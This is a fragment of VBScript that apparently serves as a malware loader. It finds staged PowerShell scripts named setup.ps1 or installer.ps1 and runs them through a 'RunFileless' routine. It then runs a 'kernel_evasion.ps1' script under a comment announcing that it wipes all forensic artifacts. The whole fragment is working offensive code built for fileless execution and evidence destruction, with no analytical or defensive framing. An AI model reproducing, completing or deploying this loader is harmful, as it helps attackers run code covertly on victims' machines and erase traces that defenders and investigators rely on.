...
Dim sSetup, sPrefix
sPrefix = "$scriptRoot = '" & Replace(sDir, "'", "''") & "';" & vbCrLf
sSetup = ""
If oFSO.FileExists(sDir & "\setup.ps1") Then
    sSetup = sDir & "\setup.ps1"
ElseIf oFSO.FileExists(sDir & "\files\setup.ps1") Then
    sSetup = sDir & "\files\setup.ps1"
ElseIf oFSO.FileExists(sDir & "\installer.ps1") Then
    sSetup = sDir & "\installer.ps1"
ElseIf oFSO.FileExists(sDir & "\files\installer.ps1") Then
    sSetup = sDir & "\files\installer.ps1"
End If

If sSetup <> "" Then
    RunFileless sSetup, sPrefix
End If

' ── 2. KERNEL EVASION: Wipe all forensic artifacts ──────────────────────────
Dim sKernel
sKernel = ""
If oFSO.FileExists(sDir & "\kernel_evasion.ps1") Then
    sKernel = sDir & "\kernel_evasion.ps1"
ElseIf oFSO.FileExists(sDir & "\files\kernel_evasion.ps1") Then
    sKernel = sDir & "\files\kernel_evasion.ps1"
End If

If sKernel <> "" Then
    RunFileless sKernel, sPrefix
End If
